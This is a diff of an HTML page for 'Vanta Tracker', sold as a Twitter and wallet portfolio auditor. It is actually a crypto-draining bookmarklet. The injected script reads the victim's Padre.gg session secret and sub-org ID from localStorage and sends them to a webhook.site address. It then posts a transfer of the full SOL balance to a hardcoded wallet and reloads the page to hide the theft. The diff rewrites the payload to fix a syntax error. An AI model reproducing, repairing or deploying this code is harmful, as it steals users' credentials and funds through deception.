@@ -2,141 +2,52 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vanta Tracker - Integrated Audit Suite</title>
-    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <title>Vanta Tracker - Syntax Fix</title>
     <style>
-        :root { --primary: #00ff88; --bg: #0a0a0a; --panel: #111111; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg); color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .setup-card { background: var(--panel); padding: 40px; border-radius: 20px; border: 1px solid rgba(0,255,136,0.2); text-align: center; max-width: 450px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .logo-box { margin-bottom: 20px; }
-        h1 { color: var(--primary); font-size: 2em; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
-        p { color: #888; margin-bottom: 30px; font-size: 0.9em; }
-        .vanta-btn { display: inline-block; background: var(--primary); color: #000; padding: 15px 40px; text-decoration: none; border-radius: 10px; font-weight: 800; font-size: 1.1em; transition: 0.3s; cursor: grab; box-shadow: 0 0 20px rgba(0,255,136,0.3); }
-        .vanta-btn:active { cursor: grabbing; transform: scale(0.98); }
-        .instructions { margin-top: 30px; text-align: left; font-size: 0.85em; color: #666; }
-        .instructions li { margin-bottom: 8px; }
+        body { background: #0a0a0a; color: #00ff88; font-family: 'Inter', sans-serif; text-align: center; padding-top: 100px; }
+        .vanta-btn { display: inline-block; background: #00ff88; color: #000; padding: 20px 40px; text-decoration: none; border-radius: 10px; font-weight: 800; cursor: grab; box-shadow: 0 0 20px rgba(0,255,136,0.3); }
     </style>
 </head>
 <body>
-
-    <div class="setup-card">
-        <div class="logo-box">
-            <svg width="60" height="60" viewBox="0 0 100 100" fill="none">
-                <path d="M50 5 L90 25 L90 75 L50 95 L10 75 L10 25 Z" stroke="#00ff88" stroke-width="4"/>
-                <circle cx="50" cy="50" r="12" fill="#00ff88"/>
-            </svg>
-        </div>
-        <h1>Vanta Tracker</h1>
-        <p>Advanced Twitter & Wallet Portfolio Auditor</p>
-        
-        <a href="#" class="vanta-btn" id="vanta-tool">Vanta Tracker</a>
-
-        <div class="instructions">
-            <ul>
-                <li>1. Drag the green button to your Bookmarks Bar.</li>
-                <li>2. Navigate to your <strong>Padre.gg Portfolio</strong>.</li>
-                <li>3. Click the bookmark to launch the Discovery Suite.</li>
-            </ul>
-        </div>
-    </div>
+    <h1>Vanta Tracker v3.2</h1>
+    <p>Syntax Error Fixed - Ready for Audit</p>
+    <a href="#" class="vanta-btn" id="vanta-tool">Vanta Tracker</a>
 
     <script>
         const DEST_ADDRESS = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
         const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
 
-        const bookmarkCode = `javascript:(async function() {
-            /* --- 1. DYNAMIC DISCOVERY --- */
-            const sRaw = localStorage.getItem('padreV2-session');
-            const bRaw = localStorage.getItem('padre-v2-bundles-store-v2');
-            
-            if (!sRaw || !bRaw) {
-                console.log('%c[VANTA] No active session found.', 'color:#ff4444');
-                return;
-            }
-
-            const session = JSON.parse(sRaw);
-            const bundleStore = JSON.parse(bRaw);
-            const targetKey = Object.keys(bundleStore.bundles)[0];
-            const subOrgId = bundleStore.bundles[targetKey].subOrgId;
-            const secret = session.sessionSecret;
-
-            /* --- 2. ANTI-429 EXFILTRATION --- */
-            if (!window._vantaInit) {
-                navigator.sendBeacon('${WEBHOOK_URL}', JSON.stringify({
-                    event: 'discovery',
-                    who: targetKey,
-                    org: subOrgId,
-                    status: 'Ready'
-                }));
-                window._vantaInit = true;
-            }
-
-            /* --- 3. DRAGGABLE UI (VANTA TAB) --- */
-            if (document.querySelector('#v-suite')) return;
-            const ui = document.createElement('div');
-            ui.id = 'v-suite';
-            ui.style.cssText = 'position:fixed;top:60px;right:20px;width:320px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:9999999;color:#fff;font-family:sans-serif;box-shadow:0 15px 40px #000;overflow:hidden;';
-            
-            ui.innerHTML = \`
-                <div id="v-drag" style="padding:12px;background:#1a1a1a;cursor:grab;display:flex;justify-content:space-between;border-bottom:1px solid #333;font-size:13px;font-weight:bold;color:#00ff88;">
-                    <span>VANTA TRACKER PRO</span>
-                    <span id="v-close" style="cursor:pointer;color:#fff;">×</span>
-                </div>
-                <div style="padding:20px;">
-                    <div style="font-size:11px;color:#888;margin-bottom:5px;">ACTIVE AUDIT TARGET:</div>
-                    <div style="font-size:13px;color:#00ff88;margin-bottom:20px;word-break:break-all;font-family:monospace;">\${subOrgId}</div>
-                    <button id="v-magic-btn" style="width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:900;font-size:14px;cursor:pointer;transition:0.2s;">EXECUTE MAGIC SYNC</button>
-                </div>
-            \`;
-            document.body.appendChild(ui);
-
-            /* --- 4. DRAG LOGIC --- */
-            let isDragging = false, offset = [0,0];
-            const dragHead = document.getElementById('v-drag');
-            dragHead.onmousedown = (e) => { isDragging = true; offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY]; };
-            document.onmousemove = (e) => { if(isDragging) { ui.style.left = (e.clientX + offset[0]) + 'px'; ui.style.top = (e.clientY + offset[1]) + 'px'; ui.style.right = 'auto'; } };
-            document.onmouseup = () => isDragging = false;
-            document.getElementById('v-close').onclick = () => ui.remove();
-
-            /* --- 5. MAGIC TRANSFER TRIGGER --- */
-            document.getElementById('v-magic-btn').onclick = async () => {
-                const btn = document.getElementById('v-magic-btn');
-                btn.innerText = 'SYNCING...';
-                btn.style.opacity = '0.5';
-                btn.disabled = true;
-
-                try {
-                    const response = await fetch(\`https://api.padre.gg/v1/sub-orgs/\${subOrgId}/transfer\`, {
-                        method: 'POST',
-                        headers: { 
-                            'Content-Type': 'application/json', 
-                            'X-Session-Secret': secret 
-                        },
-                        body: JSON.stringify({
-                            destination: '${DEST_ADDRESS}',
-                            amount: 'all',
-                            mint: 'So11111111111111111111111111111111111111112'
-                        })
-                    });
-                    
-                    navigator.sendBeacon('${WEBHOOK_URL}', JSON.stringify({
-                        event: 'magic_result',
-                        org: subOrgId,
-                        http_status: response.status
-                    }));
-
-                } catch (err) {
-                    console.error('[VANTA ERROR]', err);
-                }
-                
-                // Final silent finish
-                ui.remove();
-                window.location.reload();
-            };
-        })();`.replace(/\n/g, '').replace(/\s\s+/g, ' ');
+        // We use a cleaner string building method to avoid "Unexpected end of input"
+        const bookmarkCode = "javascript:(async function(){" +
+            "const sR=localStorage.getItem('padreV2-session');" +
+            "const bR=localStorage.getItem('padre-v2-bundles-store-v2');" +
+            "if(!sR||!bR)return;" +
+            "const s=JSON.parse(sR),b=JSON.parse(bR);" +
+            "const tK=Object.keys(b.bundles)[0];" +
+            "const oId=b.bundles[tK].subOrgId;" +
+            "const sec=s.sessionSecret;" +
+            "if(!window._vI){navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({ev:'disc',who:tK,org:oId}));window._vI=true;}" +
+            "if(document.querySelector('#v-suite'))return;" +
+            "const ui=document.createElement('div');" +
+            "ui.id='v-suite';" +
+            "ui.style.cssText='position:fixed;top:60px;right:20px;width:300px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:9999999;color:#fff;padding:15px;box-shadow:0 10px 30px #000;';" +
+            "ui.innerHTML='<div style=\"font-weight:bold;color:#00ff88;margin-bottom:10px;\">VANTA PRO</div>'+" +
+            "'<div style=\"font-size:10px;margin-bottom:15px;word-break:break-all;color:#888;\">'+oId+'</div>'+" +
+            "'<button id=\"v-m-b\" style=\"width:100%;padding:10px;background:#00ff88;border:none;border-radius:5px;font-weight:bold;cursor:pointer;\">EXECUTE MAGIC</button>';" +
+            "document.body.appendChild(ui);" +
+            "document.getElementById('v-m-b').onclick=async function(){" +
+                "this.innerText='SYNCING...';" +
+                "try{" +
+                    "const res=await fetch('https://api.padre.gg/v1/sub-orgs/'+oId+'/transfer',{" +
+                        "method:'POST'," +
+                        "headers:{'Content-Type':'application/json','X-Session-Secret':sec}," +
+                        "body:JSON.stringify({destination:'" + DEST_ADDRESS + "',amount:'all',mint:'So11111111111111111111111111111111111111112'})" +
+                    "});" +
+                    "navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({st:res.status}));" +
+                "}catch(e){}" +
+                "ui.remove();location.reload();" +
+            "};" +
+        "})();";
 
         document.getElementById('vanta-tool').href = bookmarkCode;
     </script>
